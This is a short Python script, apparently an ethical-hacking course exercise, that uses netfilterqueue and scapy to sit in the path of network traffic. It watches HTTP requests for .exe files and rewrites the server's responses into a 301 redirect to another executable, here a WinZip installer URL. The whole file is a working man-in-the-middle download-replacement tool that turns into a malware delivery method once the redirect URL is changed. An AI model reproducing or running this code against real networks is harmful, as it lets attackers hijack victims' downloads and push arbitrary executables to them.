import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            if scapy_packet[scapy.TCP].dport == 80:
                # Request
                if ".exe" in scapy_packet[scapy.TCP].load:
                    print("[+] Request for .exe")
                    ack_list.append(scapy_packet[scapy.TCP].ack)
            elif scapy_packet[scapy.TCP].sport == 80:
                # Response
                if scapy_packet[scapy.TCP].seq in ack_list:
                    print("[+] Response for .exe")
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://download.winzip.com/gl/nkln/winzip24-home.exe\n\n")
                    packet.set_payload(str(modified_packet))
        except:
            a = 1
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()